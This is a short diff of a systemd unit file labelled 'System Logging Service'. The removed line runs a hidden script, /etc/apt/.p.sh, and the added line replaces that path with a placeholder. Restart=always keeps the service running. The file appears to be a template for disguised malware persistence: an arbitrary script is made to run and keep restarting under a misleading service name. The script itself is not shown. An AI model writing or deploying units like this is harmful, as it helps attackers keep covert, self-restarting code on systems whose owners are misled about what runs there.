@@ -3,7 +3,7 @@ Description= System Logging Service
 After=network.target
 
 [Service]
-ExecStart=/bin/bash /etc/apt/.p.sh
+ExecStart=/bin/bash [REPLACE WITH SCRIPT LOCATION]
 Restart=always
 Slice=null
 RestartSec=15s  # Wait longer before restarting
